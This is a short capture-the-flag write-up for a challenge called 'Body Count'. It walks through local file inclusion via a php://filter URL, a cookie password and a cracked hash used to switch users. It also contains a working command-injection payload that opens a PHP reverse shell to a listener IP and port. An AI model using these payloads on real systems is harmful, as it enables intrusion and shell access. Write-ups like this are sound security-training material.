# Body Count

Looking at the url path(`/?file=wc.php`), we can try to access files with LFI. `/?file=php://filter/convert.base64-encode/resource=wc.php` gives us the source code([wc.php](./wc.php)). We need to somehow access the environment variables in order to move on to the second step. After some trial and error, plus a tip from my teammate `jalibr33z3`, we realize that `/?file=robots.txt` points us to `checkpass.php`. Using the same technique, we can read its source code([checkpass.php](./checkpass.php)). Setting our cookie to `password=w0rdc0unt123` brings us to the second step.

This step is vulnerable to Command Injection, so we can spawn a reverse shell with `'; (php -r '$sock=fsockopen("127.0.0.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");') || echo '`, substituting in your ip and port. We find a `/ctf` folder, with a README and some other directories. The README says:
`My password hash is 6f246c872cbf0b7fd7530b7aa235e67e.`
Cracking this results in `csictf`. We can find the flag file with `find . | grep flag`, which ends up being `./system/of/a/down/flag.txt`. However, we do not have sufficient permissions to read it. We `su ctf` and enter `csictf` as the password, giving us the perms needed to read the flag file.

Flag: csictf{1nj3ct10n_15_p41nfu1}
